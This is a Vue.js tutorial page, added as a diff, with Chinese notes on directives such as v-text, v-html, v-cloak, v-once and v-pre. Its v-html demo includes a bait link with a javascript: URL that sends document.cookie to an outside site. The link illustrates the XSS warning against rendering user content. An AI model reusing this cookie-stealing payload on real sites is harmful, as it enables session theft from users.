@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang='en'>
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title></title>
+  <script src="../js/vue.js"></script>
+  <style>
+    [v-cloak] {
+      display: none;
+    }
+  </style>
+  <!-- 
+    小结
+      1. 已学指令
+			  - v-bind:xxx="yyy" ==> 单向绑定解析表达式, 可简写为 :xxx="yyy"; xxx 是属性名, yyy 是 JS 表达式
+				- v-model:value="yyy" ==> 双向数据绑定, 可简写为 v-model="yyy"; yyy 是 JS 表达式
+				- v-for="xxx in/of yyy" ==> 遍历数组/对象/字符串; yyy 可以是对象、数组、字符串、数字, xxx 根据 yyy 类型的不同而不同
+				-	v-on:xxx="yyy" ==> 绑定事件监听, 可简写为 @xxx="yyy"; xxx 是事件名, yyy 是回调函数
+				-	v-if="yyy" 和 v-else-if="yyy" 和 v-else ==> 条件渲染（动态控制节点是否存存在）; yyy 是 JS 表达式
+				-	v-show="xxx" ==> 条件渲染 (动态控制节点是否展示); yyy 是 JS 表达式
+      2. v-text="yyy" ==> 向其所在的节点中渲染文本内容; yyy 是 JS 表达式
+        - 与插值语法的区别：v-text 会替换掉节点中的所有内容，{{xx}} 则不会。
+        - 注：v-text 渲染的是文本内容，因此即使 yyy 是 html 字符串，也只会以文本的内容渲染出来
+      3. v-html="yyy" ==> 向指定节点中渲染包含 html 结构的内容。
+				- 与插值语法的区别：
+					- v-html 会替换掉节点中所有的内容，{{xx}} 则不会。
+					-	v-html 可以识别 html 结构。
+        - 注：v-html 有安全性问题！！！！
+          - 在网站上动态渲染任意 HTML 是非常危险的，容易导致 XSS 攻击。
+					- 一定要在可信的内容上使用 v-html，永不要用在用户提交的内容上！
+      4. v-cloak ==> 本质是一个特殊属性，Vue 实例创建完毕并接管容器后，会删掉 v-cloak 属性。
+				- 使用 css 属性选择器配合 v-cloak 可以解决网速慢时页面显示出 {{xxx}} 的问题。
+          [v-clock]{
+            display: none; // 当 Vue 实例没有加载接管容器前，v-clock 属性不会消失，此时可以使用属性选择器隐藏掉对应的 DOM 元素
+          }
+      5. v-once ==> v-once 所在节点在初次动态渲染后，就视为静态内容了; 以后数据的改变不会引起 v-once 所在结构的更新，可以用于优化性能。
+      6. v-pre ==> 跳过其所在节点的编译过程; 可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。
+   -->
+</head>
+
+<body>
+  <!-- #region v-text v-html 的使用 -->
+  <div id="root">
+    <h2>v-text 指令的使用</h2>
+    <p v-text="msg"></p>
+    <hr>
+    <h2>v-html 指令的使用</h2>
+    <p v-html="fraudHtml"></p>
+    <hr>
+  </div>
+
+  <script>
+    new Vue({
+      el: "#root",
+      data: {
+        msg: "你好，世界",
+        /* 这个 a 标签会获取到用户当前页面的 cookie 信息，从而导致黑客攻击 */
+        fraudHtml: "<a href='javascript:location.href=\"http://www.baidu.com?\" + document.cookie'>点击免费领取地狱火</a>",
+      }
+    })
+  </script>
+  <!-- #endregion -->
+
+  <!-- #region v-cloak 的使用 -->
+  <div id="rooter">
+    <h2>v-cloak 指令的使用</h2>
+    <p v-cloak>{{finallyMsg}}</p>
+    <hr>
+  </div>
+
+  <script>
+    async function delay5s() {
+      await new Promise((resolve, reject) => {
+        console.log('5s 后再加载 Vue 实例对象');
+        setTimeout(() => {
+          resolve('setTimeout');
+        }, 5000)
+      });
+      await new Vue({
+        el: "#rooter",
+        data: {
+          finallyMsg: "等待了一段时间后，Vue 实例终于加载成功"
+        }
+      })
+    }
+    delay5s();
+  </script>
+  <!-- #endregion -->
+
+  <!-- #region v-once v-pre 的使用 -->
+  <div id="r">
+    <h2 v-pre>v-once & v-pre 指令的使用</h2>
+    <p v-once>初始功德为 {{merit}}</p>
+    <p>当前功德为 {{merit}}</p>
+    <button @click="merit++">功德+1</button>
+  </div>
+
+  <script>
+    new Vue({
+      el: "#r",
+      data: {
+        merit: Math.floor(Math.random() * 1000)
+      }
+    })
+  </script>
+  <!-- #endregion -->
+</body>
+
+</html>
